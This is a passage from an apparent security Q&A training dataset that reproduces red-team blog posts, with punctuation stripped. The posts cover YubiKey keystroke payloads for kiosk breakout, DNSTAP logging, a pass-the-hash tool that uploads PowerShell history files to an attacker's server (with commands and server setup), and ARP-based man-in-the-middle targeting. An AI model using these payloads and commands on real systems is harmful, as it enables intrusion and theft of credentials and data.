        "output": "Michael Allen A couple of years ago I had a YubiKey that was affected by a security vulnerability and to fix the issue Yubico sent me a brand new YubiKey for free Since I didn't use the old YubiKey for authentication after receiving the new one I decided to see if I could turn it into something similar to a USB Rubber Ducky a USB device that emulates a keyboard and sends a computer a series of pre-programmed keypresses when it is plugged in It turned out that I was able to do just that and although a stock YubiKey isn't ideal as a USB drop it's convenient for everyday carry is often less conspicuous than a flash drive and has come in handy for me several times as an impromptu way to break out of a kiosk's restricted shell when other tools were not available In this post I'll explain how I identified all the key presses that could be generated by my stock YubiKey using a US keyboard layout and then crafted payloads using those keys Step 1 Download the YubiKey Personalization Tool YubiKey provides a program on their website called the YubiKey Personalization Tool YPT that can be used to customize the different features of the YubiKey on Linux Windows or Mac I'm using the Linux version in this post but the Windows and Mac versions should work very similarly Download the YubiKey Personalization Tool If you use the Linux version as I did you may need to build the program from the source code provided by YubiKey Instructions for how to do so are included in the README file that comes with the source code and are easy to follow so I won't cover them here Step 2 Programming the YubiKey with a static password In its default configuration the YubiKey will type a unique authentication token whenever it is used and that token changes on each use However the YubiKey can also be programmed to type in a static user-defined password instead Since the YubiKey enters data into the computer just like a regular keyboard I wanted to find out whether it could be used to press more interesting keys like CTRL ALT or the Windows key in addition to the standard letters digits and symbols To test this I started up the YPT and selected the Static Password option from the bar across the top Then on the Static Password page I clicked the button labeled Scan Code To understand how everything worked I started by programming the YubiKey with the very simple static password abcdef To do that I selected the following options in the Static Password window Configuration Slot Configuration Slot 1 Keyboard US Keyboard Password abcdef I noticed that while I was typing my password into the Password field hexadecimal values started showing up in the Scan Codes field to its right I took note of that and decided that my next step after programming the YubiKey with a static password should be to identify the hexadecimal value for every key I wanted to type That way I might be able to program it with keypresses that I couldn't type into the password field keys like CTRL and ALT The following screenshot shows all the settings I outlined above and the scan codes that were generated by typing in my password Next I clicked Write Configuration to write the static password to my YubiKey When doing this for the first time a dialog box popped up asking me to confirm that I wanted to overwrite the current configuration of Slot 1 on my YubiKey I checked the box labeled Don't show this message again and clicked Yes to write the changes to the device WARNING If you're following along with your own YubiKey make sure it's one you're not currently using for authentication Writing the new configuration to the YubiKey will erase the settings stored in the Configuration Slot you select and you'll have to reprogram your YubiKey and re-register it with the services you use to use it for multi-factor authentication again If you use only one Configuration Slot on the YubiKey for authentication you can probably overwrite the other one safely But if you're unsure it might be best to either unregister your YubiKey from any services you use first or to just use a different YubiKey After writing the changes I opened a text editor and pressed the hardware button on the YubiKey The YubiKey typed the password abcdef on the screen as expected Step 3 Identifying YubiKey's hexadecimal key codes Now that I had confirmed I could get the YubiKey to enter a series of predefined keys the next thing I wanted to do was figure out whether I could make it press more interesting keys by specifying hexadecimal Scan Codes in the YPT To start mapping scan codes to their corresponding key presses I started with the very low-tech approach of typing the letters a through z into the Password field of the YPT and observing the results in the Scan Codes field This resulted in the hexadecimal values 04 through 1D appearing in the Scan Codes field I repeated this process for all the other printable keys on my keyboard as well as the uppercase version of each I made a note of all the hex values I collected and of the ranges of values that I hadn't yet matched to a key on the keyboard I organized all the characters I was able to decode into a table and after doing so I noticed a pattern It appeared that the scan codes were divided down the middle with the lowercase characters all located between 00-7F and the uppercase or key Shift versions present in the same location between 80-FF This can be seen more clearly in the table below Now all that was left to do was identify the keypresses generated by the hex values in each unknown range Because typing the hex values into the Scan Codes field in YPT didn't display any output and because I expected many of the keys pressed in the unknown ranges to be keys that didn't generate any printable output e.g the CTRL key I needed a way to capture the raw keypresses generated by the YubiKey For this I decided to use the Linux tool xinput and my xinput-keylog-decoder script to decode the output If you're not familiar with xinput it is a command-line tool that's commonly included in many Linux distributions along with the graphical desktop environment It's also commonly abused as a keylogger when those systems are compromised and I created the xinput-keylog-decoder tool for that purpose Since the YubiKey is essentially a keyboard the first thing I did to start capturing its keypresses was to identify its ID number within xinput I checked this by running the xinput command without any arguments and determined that its ID was 16 as shown in the output below By default the example script that comes with xinput-keylog-decoder logs input from all keyboards attached to the system but knowing the ID of the YubiKey let me target that device specifically when parsing the output Next I opened three terminal windows and ran commands to log and analyze the keypresses generated by the YubiKey An explanation of the purpose of each command follows the screenshot below Top terminal Stop any currently running xinput processes start a new xinput process and start an infinite loop to read input from the keyboard This is the terminal window I kept selected while the YubiKey typed keys into the system That way anything it typed wouldn't interfere with the other terminal windows stop-logging.sh 0 rm txt start-logging.sh while true do read sleep 0.1 done Middle terminal Display the raw output of test-output.16.txt on-screen every one second test-output.16.txt is the file where keypresses from keyboard ID 16 were automatically saved Displaying the raw key codes output by xinput allowed me to get more information in case xinput-keylog-decoder.py failed to decode a keypress in the third terminal window watch -n 1 tail test-output.16.tx Bottom terminal Every second decode the keylog file and display it as human-friendly text watch -n 1 xinput-keylog-decoder.py test-output.16.txt Finally when programming the hexadecimal scan codes into the YubiKey I started by entering them between two known characters usually a scan code 04 and b scan code 05 This way I could confirm that the keys before and after the target key press were actually pressed and it allowed me to identify whether the keypress had any effect on those other keys Below is an example of this process while targeting the scan code 2A In the first screenshot you can see the unidentified scan code 2A sandwiched between the scan codes for a and b You might also notice the apparent blank space between a and b in the password field In the next screenshot I selected the top terminal and pressed the button on my YubiKey At first glance it appears that only the b key was pressed and the a was omitted However after examining the middle window you can see that three keys were each pressed and released in succession In the third window the key codes from the middle window are decoded into a human-friendly format and it's clear that the keys pressed were a the backspace key and b This explains why a didn't appear in the first window and identifies the target scan code 2A as the backspace key After identifying a key this way all I did next was press CTRL C to stop the running loop in the top window run the command again to clear the log and restart the logger and then repeat the process above After repeating these steps for every unidentified hex value I confirmed the keypresses generated by every possible scan code and collected them in the table below While decoding the scan codes I also observed that the YubiKey will automatically press the Enter key at the end of some sequences of key presses In some cases I was able to prevent this behavior by terminating the sequence with the scan code 00 but it didn't always work To demonstrate here is a screenshot of the YubiKey being configured to type the letters a through z and a screenshot of the output once the YubiKey's button is pressed Note that the z key scan code 1D was the last key programmed into the YubiKey but the YubiKey pressed Enter at the end of the string anyway This is different than the behavior observed when decoding the code for the backspace key in the previous example where the Enter key was not pressed Both the length of the key-press sequence and the YubiKey's output speed configurable from the Settings screen in YPT appear to affect this behavior In my testing the extra Enter key didn't appear in sequences less than 23 keys long that were typed at the standard output character rate However slowing the character rate by 60 ms caused the Enter key to be automatically pressed on sequences as short as one keypress Watch out for this when creating payloads on your YubiKey if you don't want it to automatically press Enter at the end Step 4 Creating useful payloads With all of the scan codes matched to the keys they press I was now ready to start building payloads Unfortunately none of the scan codes I tested pressed the CTRL ALT or Windows keys I had hoped to find so while it could be used to type in a long one-liner it was not ideal as a fully-automated command injection tool or USB drop like a Rubber Ducky or Teensy Even though the YubiKey won't press CTRL ALT or the Windows key it still has access to several other potentially interesting keys including Shift By using one of the Shift No effect scan codes Function Keys F1-F12 Menu Key equivalent of a mouse right-click Escape The Shift key in combination with all the identified keys Although these keys might not be preferred for injecting an executable payload into a target system one scenario where they are extremely helpful is when trying to break out of the restricted shell of a computer kiosk Because of the difficulty in fully securing kiosk software kiosk makers often physically remove keys from keyboards right-click buttons from pointing devices or completely remove both devices in favor of a touch screen But it's not uncommon for USB ports on the kiosk to remain exposed so technicians can attach their own keyboards for troubleshooting In that scenario an attacker armed with a keyboard of their own or in this case a YubiKey can just plug their keyboard into the kiosk and use one of many well-known methods to break out of the restricted shell and take control of the computer The first step in escaping from a restricted shell on a kiosk is often just opening a new application window be it a dialog box a new browser window or anything else And this is often the step where a keyboard is most helpful since the rest of the attack can usually be done with minimal input from a pointing device The table below describes key presses the YubiKey can inject to attempt to execute that first step Key PressesImpact on the Computer KioskEscapeExits the current windowPress Shift five timesOpens Windows Sticky Keys dialog boxF1Opens the Help dialog on many applications and operating systemsF6Selects the web browser address barF10 Down ArrowOpens the application menu in many applicationsF10 Down Arrow n Opens a new window in Chrome Firefox and Windows ExplorerF10 Down Arrow p Opens the print dialog in many applicationsF11Exits full-screen mode May reveal a web browser's address barF12 EscOpens web developer tools and selects the JavaScript consoleShift F10Right-click with the mouse Opens the shortcut menuShift MenuShift right-click Opens the shortcut menu with extended options to run command prompt or PowerShell in Windows ExplorerOther Function Keys F1-F12 Extra functionality in many applications Hidden features menus in some kiosk softwarePrint ScreenOpens a screenshot dialog on some systems With these functions in mind I created the three payloads below to use my YubiKey as a kiosk break-out device YubiKey Payloads Payload 1 Simple function key and Sticky Keys test Scan codes 522c3a3b3c3d3e3f404142434445e6e6e6e6e6e652 Output character rate Standard Key presses executed Activate hyperlink in Sticky Keys dialog if present Up arrow Space bar Press each function key F1 F2 F3 F4 F5 F6 F7 F8 F9 F10 F11 F12 Open the Sticky Keys dialog by pressing Shift five times plus one to be safe Shift Shift Shift Shift Shift Shift Select the hyperlink in the Sticky Keys dialog and attempt to block the Enter key from closing the window if it is pressed Up arrow Payload 2 Browser hotkeys and Sticky Keys Scan codes 3f2a06b3a83f4dca06b3283c443e3b3d40ab2c29e5115128454142435113113ae6e6e6e6e652 Output character rate Slow down by 60 ms Key presses executed Open c in a new browser window F6 Backspace Type c Shift Enter Open c Chrome F6 End Shift Home c Enter Press function keys F3 F11 F5 F2 F4 Try F7 and close the dialog box if one appears F7 Shift Tab Space Esc Open a new browser window Shift Menu n Down Enter Try F12 Web developer console F12 Try F8 and F9 F8 F9 Open the print dialog or a new browser F10 Down p n Try F1 Help F1 Open the Sticky Keys dialog Shift Shift Shift Shift Shift Prevent the Enter key from closing the Sticky Keys dialog Up Payload 3 Shift Right Click Scan codes e5 Output character rate Standard Key presses executed Shift Menu key The first payload is very simple it presses the up arrow the space bar each function key F1-F12 and then presses the Shift key six times before pressing the up arrow again The purpose of this payload is to test each function key to see if it provides a way to access additional functionality on the kiosk and then press the Shift key repeatedly to open the Sticky Keys dialog box Once the Sticky Keys dialog is open the button on the YubiKey can be pressed a second time and the up arrow and space bar key presses will open the hyperlink in the dialog box to navigate to Windows Ease of Access settings This was the first payload I created for the YubiKey and it's been very successful at breaking out of restricted shells on multiple platforms in the field The second payload is an attempt to improve on the first by adjusting the use of the function keys to reflect their functions in common web browsers For example it doesn't make sense to press F7 and then immediately try F8 because pressing F7 in most browsers causes a prompt to appear effectively blocking F8 from being pressed in the context of the browser Every function key is still pressed along with the Sticky Keys sequence as in the first payload Additional keys are included to attempt to automatically select menu options and provide browser cross-compatibility This payload is a new one that I put together while writing this article so it hasn't been used in the field yet It's worked well in a lab environment so far especially when run more than once Finally the third payload just presses Shift plus the Menu key This is effectively the same thing as holding the Shift key and right-clicking with the mouse It gives me the ability to add a right mouse button to the kiosk so I can right-click on different things once I get an initial foothold It also provides a quick shortcut to PowerShell or a command prompt if I can right-click inside an Explorer window I usually keep this payload in Slot 2 on my YubiKey with one of the other payloads in Slot 1 Conclusion Although the YubiKey is an excellent two-factor authentication device it's definitely missing a few features that would make it an ideal USB HID attack tool and there are other products that already do the job much better Probably the main strength of the YubiKey as an attack tool is that it looks like a YubiKey In high-security environments where flash drives are not allowed it might be possible to smuggle in a YubiKey and in close-up social engineering scenarios it might be easier to convince an employee to open up the cabinet of a public Internet kiosk so you can authenticate to your email account than it would be to plug in some unrecognized device In my mind that's the main takeaway from experimenting with the YubiKey With a little bit of effort and a relatively small amount of technical know-how even trusted electronic devices can be made into tools of attack"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Tap Into Your Valuable DNS Data</title>\n<taxonomies>Author, Blue Team, DNSTAP, How-To, Informational, Joff Thyer, Recon, Red Team, BIND, DNS, DNSTAP, Farsight Security, Joff Thyer, Logging, Paul Vixie</taxonomies>\n<creation_date>Mon, 03 Jun 2019 15:21:48 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer The Domain Name System DNS is the single most important protocol on the Internet The distributed architecture of DNS name servers and resolvers has resulted in a resilient and highly scalable system that is largely unchanged from the early days of NSFNET It is a unique solution that allows domain holders to manage their own zone data while still being linked into the global hierarchy of distribution Internet domains across the world In the security context knowing what our client systems are looking up in the DNS yields valuable information about normal versus abnormal operations in any environment Nearly all organizations will run recursive DNS servers within their environments and almost all communications that your internal client stations engage in are likely to be preceded by one or more DNS lookup requests Logging these requests and responses must be viewed as a necessity as it represents a valuable source of data for both security and operational analysis Having said that logging the data is where things get a little tricky The challenge is this most DNS name servers for even a modest-sized organization are subject to considerable network load They are constantly bombarded with requests and are rightfully implemented as multi-threaded high-performance code An internal Microsoft domain controller name server has a feature to enable debug logging however it is not recommended to keep it enabled The reason is that the continuous file I O operations to write out the log data will slow things down Any disk write operation is subject to kernel buffers and associated wait time for the I O buffers to be flushed to disk The Internet Software Consortium's BIND server has had a logging feature within the configuration for some time however the same issue applies Enabling this feature will slow things down as the server writes out logging information to disk For a small network with about a half dozen endpoints like my network at home you probably don't really care or would even notice the penalty of logging DNS requests with synchronous file I O In larger environments enabling such logging features will impact overall server performance to the detriment of internal users Furthermore within the DNS code threads if there is a choice between servicing a new DNS request versus writing buffered log information to disk the DNS requests will likely be serviced as a priority and log entries may well be lost One possible solution is to deploy additional systems such as a Bro sensor or full packet capture solution to listen to network data This will typically involve mirroring data with a network SPAN port configuration or dedicated optical tap upstream of the DNS server Clearly such a solution involves additional expense and complexity Why not just collect the data directly from the source DNS server DNSTAP DNSTAP proposed by Farsight Security solves the I O performance bottleneck yielding valuable logging information directly from the DNS server itself DNSTAP logs query and response information in a flexible binary structured log format using Google's protocol buffer implementation The architecture diagram from nstap.info gives a sense of the logical components of DNSTAP In short there is an encoding of a copy of the DNS data itself which is then serialized to a reliable byte stream by the sender DNS server The resulting serialized data can be read by receiver software and logged to file if needed By separating the DNSTAP byte stream I O from the DNS server operation itself solves the slow logging I O problem and yields a great deal of granularity given that the resulting data is the actual DNS requests and responses themselves DNSTAP is available for Bind Unbound and the Knot server implementations For the remainder of this blog I am going to focus on the BIND server implementation After listening to Paul Vixie speak about DNSTAP at Wild West Hackin Fest and after some additional research I decided to enable DNSTAP in my home office network In my case I am running an Ubuntu 18.04 based router gateway and DNS server The first discovery I made was that the latest Ubuntu 18.04 patched distribution of BIND did not have the DNSTAP code compiled into the distribution This is going to require manually building the ISC BIND server from source Before compiling it an Ubuntu system with the appropriate source code build tools installed will be needed Preferably this should not be the target system for final installation sudo apt update sudo apt install build-essential libtool autoconf automake libssl-dev Additionally DNSTAP depends upon Google protocol buffers the protocol file compiler and the related frame stream tools These items are actually available from the Ubuntu repositories although you might choose to compile them for the latest greatest code Using the Ubuntu repositories I installed these as follows sudo apt install libprotobuf-c-dev libprotobuf-c1 sudo apt install protobuf-c-compiler sudo apt install fstrm-bin libfstrm0 libfstrm-dev libfstrm0-dbg Although the frame stream tool is available from Ubuntu's repositories if you want the latest software you might consider visiting Farsight's GitHub repository and cloning the source from there for building git clone ithub.com farsightsec fstrm.git cd fstrm autogen.sh configure make sudo make install Once you have the dependencies installed you should download the latest source code for BIND I chose Bind 9.14 as it has the code for DNSTAP included and considered a current stable release as of today's date wget ftp ftp.isc.org isc bind9 cur 9.14 bind-9.14.2.tar.gz tar -xzf bind-9.14.2.tar.gz cd bind-9.14.2 configure --enable-dnstap --sysconfdir etc bind --localstatedir --enable-threads --enable-largefile --with-libtool --enable-shared --enable-static --with-gnu-ld --enable-dnsrps --prefix usr local make sudo make install At this point you would probably be wise to remove the Ubuntu BIND distribution so that there is no confusion as to which version of the named binary you are using for DNS sudo dpkg --remove bind9 Capturing the Frame Stream For optimal results you want your BIND name server to write its logging information to a UNIX socket and then use the frame stream capture program to read that socket and create a log file in the binary protocol buffers format Subsequently you can use a program called dnstap-read included in the BIND distribution to read the binary format and produce readable output as needed It is important to start the frame stream capture process before BIND so that the UNIX socket will be created for you I opted to first experiment with the command-line options and then ultimately created a systemd service to ensure that the fstrm_capture binary was always started before BIND My available logging disk space was limited so I decided to rotate the output logging file on a daily basis using 86 400 seconds as the rotate split parameter Systemd Configuration File saved as lib systemd system framestream.service As can be seen above when this service is started the UNIX socket named dnstap.sock is created in the var cache bind directory Configuring BIND The BIND configuration is very straight forward and requires only two lines of configuration in the options section of the name server configuration file It should be noted that DNSTAP configuration options include different message types of data that can be logged In each case you can optionally specify query or response If you don't specify query or response then both are logged by default The message types are Auth Query received from a resolver by an authoritative name server Response sent will be from an authoritative name server These queries responses from the perspective of the authoritative name server Client Query sent from a client or stub resolver to a name server The name server is expected to perform a recursive lookup and send the response back to the client Resolver Query sent from another resolver to an authoritative name server from the perspective of the resolver Response message received from an authoritative name server by a resolver from the perspective of the resolver Forwarder DNS traffic sent received and forward to from downstream and upstream DNS servers I decided for my configuration to focus on both client and authoritative traffic Including the resolver message type can be a little noisy How you approach the configuration really depends upon your goals My BIND configuration file options section is shown below for reference Read and Analyze the Logging Data The ISC BIND distribution includes a program called dnstap-read which allows the user to read data from the binary structured protocol buffer file and print it to screen There are several useful options that can be used with dnstap-read If you don't specify any options then dnstap-read will simply read the current log and print all of the associated requests responses in the log along with an additional code indicating what sort of message type is logged Message types as extracted from the protocol buffer definition file can be AUTH_QUERY AQ AUTH_RESPONSE AR RESOLVER_QUERY RQ RESOLVER_RESPONSE RR CLIENT_QUERY CQ CLIENT_RESPONSE CR FORWARDER_QUERY FQ FORWARDER_RESPONSE FR STUB_QUERY SQ STUB_RESPONSE SR TOOL_QUERY TQ TOOL_RESPONSE TR Sample Output from dnstap-read For extra detail you can print the full DNS message using -p which yields a dig like output with all of the expected detail Both a YAML -y and hexadecimal dump -x form of the data is also available In all cases the original single line output as shown above is also included Sample Output using the -p Flag of Single Query Response Since reading and learning all about DNSTAP I have taken the extra step of starting a Python3 implementation that can parse the frame stream log forward read the data in much the same way as dnstap-read but additionally produce some statistics You can find my work here at ithub.com yoda66 DNSTAP-FrameStream-Python All credit due to Paul Vixie and the Farsight Security team for continuing to spread the word about DNSTAP with the ability to collect valuable DNS data in a scalable fashion for further analysis References ww.youtube.com watch?reload 9 v OxFFTxJv1L4 ww.vanimpe.eu 2018 12 27 dnstap-for-improved-dns-logging-on-ubuntu nstap.info Tutorials NANOG60 ithub.com farsightsec ithub.com yoda66 DNSTAP-FrameStream-Python"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Check-LocalAdminHash & Exfiltrating All PowerShell History</title>\n<taxonomies>Author, Beau Bullock, How-To, Informational, Red Team, Red Team Tools, Beau Bullock, Check-LocalAdminHash, Invoke-TheHash, PowerShell, PowerView, PSReadline, TL;DR</taxonomies>\n<creation_date>Wed, 05 Jun 2019 21:30:27 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock TL DR Check-LocalAdminHash is a new PowerShell script that can check a password hash against multiple hosts to determine if it's a valid administrative credential It also has the ability to exfiltrate all PowerShell PSReadline console history files from every profile on every system that the credential provided is an administrator of Get Check-LocalAdminHash here ithub.com dafthack Check-LocalAdminHash History Buff On a recent assessment I wanted to gather all the PowerShell console history files PSReadline from every system on the network The PSReadline console history is essentially the PowerShell version of bash history Since PowerShell version 5 everything you type into a PowerShell terminal gets logged to a file on disk It can include so many interesting things that people type into their terminals including passwords and other sensitive information I first learned about these history files from Chris Truncer during one of his amazing training courses On this particular assessment I had a local admin hash that I knew was in widespread use in the environment I did not have the cleartext credential This organization had also deployed a number of other security tools that were making pivoting very difficult Multiple EDR and behavioral analysis products were in use as well as application whitelisting RDP was protected by multi-factor authentication and SMB wasn't accessible on hosts I was trying to pivot to I was however able to connect to other systems using Windows Management Instrumentation WMI Frankenstein With my goal being to obtain all PowerShell console history files on the network I set out to write a script that could accomplish this for me I had some interesting problems to solve though I couldn't access SMB so simply copying the PSReadline files over the network wouldn't work The hosts could access the Internet though I ended up Frankensteining some other pre-existing tools along with my own code to accomplish my goal First I had to gather all the hosts from the domain To do this the first piece of code I borrowed was from PowerView I used multiple modules from PowerView for generating a list of domain computers Next I utilized more pre-existing code this time from Kevin Robertson's Invoke-TheHash to perform the authentication to each host Invoke-WMIExec and Invoke-SMBExec have the ability to Pass-the-Hash to run commands on remote systems For each system Invoke-WMIExec would connect and launch PowerShell along with an encoded command blob that includes the code for discovering any PSReadline files found within any of the profiles on the system If any are discovered they are then sent via a POST request to a web server I controlled The Frankenstein code was alive and worked surprisingly well Check-LocalAdminAccess So as it turned out the functionality of this script ended up being useful in a completely different manner It functions as a standalone PowerShell tool for determining what hosts on the network a password hash is a valid administrative credential for Very often we are still discovering that local administrator credentials are in widespread use on engagements In the past if I had a password hash I might use something like Metasploit's smb_login module to test that credential against other hosts Having accessibility to Metasploit isn't always an option on assessments though So this script being a purely PowerShell way of testing a credential hash will allow us to perform this technique natively in Windows environments Check-LocalAdminHash is this tool You can get it on Github at ithub.com dafthack Check-LocalAdminHash Below are some of the example commands you can run with Check-LocalAdminHash By the way you can still exfiltrate the PSReadline files with it Checking Local Admin Hash Against All Hosts Over WMI This command will use the domain 'testdomain.local to lookup all systems and then attempt to authenticate to each one using the user 'testdomain.local PossibleAdminUser and a password hash over WMI Check-LocalAdminHash -Domain testdomain.local -UserDomain testdomain.local -Username PossibleAdminUser -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB -AllSystems Exfiltrate All PSReadline Console History Files This command will use the domain 'testdomain.local to lookup all systems and then attempt to authenticate to each one using the user 'testdomain.local PossibleAdminUser and a password hash over WMI It then attempts to locate PowerShell console history files PSReadline for each profile on every system and then POST's them to a web server The bottom of the blog post contains instructions for setting up the server side Check-LocalAdminHash -Domain testdomain.local -UserDomain testdomain.local -Username PossibleAdminUser -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB -AllSystems -ExfilPSReadline The script also accepts target lists in CIDR format list format or you can specify single systems to test if you don't want to enumerate hosts from a domain In addition to WMI you can specify the SMB protocol if you would like to use that instead PSReadline Exfiltration Setup This is your warning that you are about to set up an Internet-facing server that will accept file uploads Typically this is a very bad thing to do so definitely take precautions when doing this I would recommend locking down firewall rules so that only the IP that will be uploading PSReadline files can hit the webserver Also while we are on the topic of security this will work just fine with an HTTPS connection so set up your domain and cert so that the PSReadline files are sent encrypted over the network You have been warned Setup a server wherever you would like the files to be sent This server must be reachable over HTTP HTTPS from each system Copy the index.php script from this repo and put it in index.php in the web root var www html on your web server Make an uploads directory mkdir var www html uploads Modify the permissions of this directory chmod 0777 var www html uploads Make sure php is installed apt-get install php Restart Apache service apache2 restart In the Check-LocalAdminHash.ps1 script itself scroll down to the Gen-EncodedUploadScript function and modify the Url variable right under UnencodedCommand Point it at your web server index.php page I haven't figured out how to pass the UploadUrl variable into that section of the code that ends up getting encoded and run on target systems so hardcode it for now Now when you run Check-LocalAdminHash with the -ExfilPSReadline flag it should attempt to POST each PSReadline if there are any to your webserver Conclusion Check-LocalAdminAccess was born out of necessity If you find yourself on a Windows system without the availability of Linux-based tools and need to test a password hash this should help provide a more native approach to testing credentials Also It wouldn't be difficult to modify the portion of the code that looks for PSReadline files to do other things on each host In the future I may change this to provide the ability to look for other files or run other commands on systems Credits Check-LocalAdminHash is pretty much a Frankenstein of two of my favorite tools PowerView and Invoke-TheHash 95 of the code is from those two tools So the credit goes to Kevin Robertson for Invoke-TheHash and credit goes to Will Schroeder Matt Graeber and anyone else who worked on PowerView Without those two tools this script wouldn't exist Also a shoutout to Steve Borosh for help with the multi-threading and just being an all-around awesome dude Invoke-TheHash ithub.com Kevin-Robertson Invoke-TheHash PowerView aw.githubusercontent.com PowerShellMafia PowerSploit dev Recon PowerView.ps1"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Analyzing ARP to Discover & Exploit Stale Network Address Configurations</title>\n<taxonomies>Author, How-To, Informational, Justin Angel, Red Team, Red Team Tools, ARP, BruteLoops, eavesarp, Justin Angel, MailSniper, netdiscover, SNAC, swisslogger</taxonomies>\n<creation_date>Wed, 12 Jun 2019 18:33:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Justin Angel Introduction In penetration testing ARP is most commonly discussed in terms of poisoning attacks where an attacker achieves a man-in-the-middle MITM position between victim nodes by contaminating the ARP cache tables of neighboring hosts While initially inspired by this technique and the desire to derive a means of passively obtaining a list of candidate targets this post aims to look at ARP from a data analytics perspective by capturing and quantifying broadcast requests to identify intercommunicating network hosts The byproduct of this effort is a simple Python tool for Debian Linux called eavesarp that was heavily influenced by Jaime Penalba's netdiscover which passively monitors for ARP requests and presents a table summarizing the sender targets and sum of ARP requests for each sender-target combination Such information is key when plotting targeted ARP poisoning attacks and identifying stale network address configurations SNACs the latter being a misconfiguration that occurs when a client for a network service has been configured with a hardcoded IP address or FQDN that is no longer associated with a live host eavesarp builds on the capabilities of netdiscover by providing active discovery of SNACs while also providing DNS name resolution capabilities If the reader is comfortable with the brief introduction above feel free to jump to the section titled Exploiting SNACs for the practical bits Otherwise the following subsections of this introduction will provide a bare-minimum summary of how ARP operates along with contextual information explaining why this came about A Brief Word Regarding the Address Resolution Protocol ARP ARP is a protocol used to resolve the MAC address for the NIC that has been configured with a given IP address Requests are sent across the network in clear text such that any member of broadcast domain can observe and record them There are countless articles on how to exploit weaknesses in ARP so this post will not discuss them at length but glancing at the abstract in RFC 826 does provide basic terminology and insight used throughout the remainder of this post sending host sender The host that wants to interact with another host target This is the host that is requesting the MAC address associated with a known IP address target host target The destination host that the sender wishes to interact with This is the owner of the MAC address associated with the IP address known by the sender Also keep in mind that only ARP requests are broadcasted not replies so it isn't possible to determine if a reply from the target is received without making an ARP request for the target or observing the response via MITM attack Contextual Babble During a recent engagement with BHIS a client deployed a Kali-based host on an internal network segment to support testing Minimal NetBIOS LLMNR traffic was observed in the environment and attempts to exploit the broadcast nature of this traffic using Responder failed to capture weak password hashes Additionally relay attacks were ineffective due to proper enforcement of SMB signing on high-value hosts Using MailSniper to verify usernames obtained via OSINT techniques and BruteLoops a horizontal brute force attack using common passwords was performed but failed to yield valid credentials Given that no glaring vulnerabilities on distinct applications and services were identified the author elected to perform targeted ARP poisoning attacks to harvest hashes and other information The issue quickly became identifying which hosts to target for poisoning while minimizing impact to network conditions As any rational assessor will attest ARP poisoning attacks are as perilous as powerful even a minor error while configuring the attack can result in denial of service DoS conditions Consideration that this phase of the engagement was executed remotely the author cannot stress the word 'targeted enough What does targeted mean in the context of ARP poisoning From the author's perspective the ideal MITM positioning is to become an intermediary node between the switch and client hosts known to interact with server hosts offering high-value services but not all of them simultaneously since the level of network traffic sent to the attacking node increases with each victim thereby resulting in elevated odds of introducing DoS conditions This MITM-the-client approach painstaking but prudent when victim hosts are user workstations since an accidental DoS to a select number of workstations is preferable to a server hosting services that may be mission critical to the client environment But how can one go about identifying which hosts are interacting with one another on a network from an unauthenticated context Though unable to know with absolute certainty that a given client is a consumer to the desired application-layer service offered by the server monitoring broadcasted ARP requests reveals which hosts attempt to resolve the MAC address for servers at the link layer Collecting and analyzing these requests over time unveils interesting relationships between hosts relative to network connections To be concise I desired a tool that performed the following functions Monitors a network interface for broadcasted ARP requests Tracks the sender and target for each request Maintains a count of how often a given sender requests a target Although the author was unaware at the time of the engagement netdiscover performs each of these functions and presents the analyzed data in a nice interactive interface However take note of the top record where the IP .3 has requested the MAC address of .7 one hundred and sixty-one times 161 This is a key indicator of a SNAC eavesarp builds on this concept by providing active verification of SNACs and providing DNS capabilities netdiscover Passively Capturing ARP Traffic From this point onward this post will focus on describing detecting and exploiting SNACs Given the appropriate conditions this misconfiguration can be leveraged to achieve a MITM position between clients and services with minimal likelihood of degrading operational capabilities of the client environment Stale Network Address Configurations SNACs A SNAC pronounced snack occurs when the client for a network service has been configured with a static address value but no response is received when an ARP request is broadcasted to resolve the target MAC address indicating that no host is currently configured with that IP address This event can occur for various reasons such as when DHCP issues a different address to the original host or if the original host has gone offline since the client was configured Repetitive ARP broadcasts from a sender for a single target within a small window of time is a strong indicator of a SNAC since ARP responses are cached after receiving a valid reply from a given target While events leading to an address configuration going stale are quite common such a configuration can be exploited to achieve interesting ends If the transport protocol for the service happens to be cleartext UDP then it's possible to capture traffic in transit by merely assuming the IP address of the stale configuration and sniffing traffic from the appropriate interface Setting a second IP for a NIC is a trivial task given proper network conditions allowing one to alias a given NIC with multiple IPs See the section titled IP Aliasing Exploiting SNACs when confronted with connection-oriented protocols presents an interesting situation since a connection must be established before the attacking host will receive any data beyond connection information However it's possible to work around this issue by capturing network traffic from an intercepting interface determine common ports the vulnerable client host is attempting to access and then bring a TCP listener online to accept the connection and initial data This allows one to determine the higher-layer protocol by using the initial payload as a fingerprint The final section of Exploiting SNACs Services Using TCP as a Transport demonstrates a potential MITM scenario that handles TCP oriented protocols by enabling IP masquerading on the attacking host Before jumping into exploitation of SNACs two additional sections are provided to illustrate use of eavesarp and how to alias network interfaces on Linux and Windows 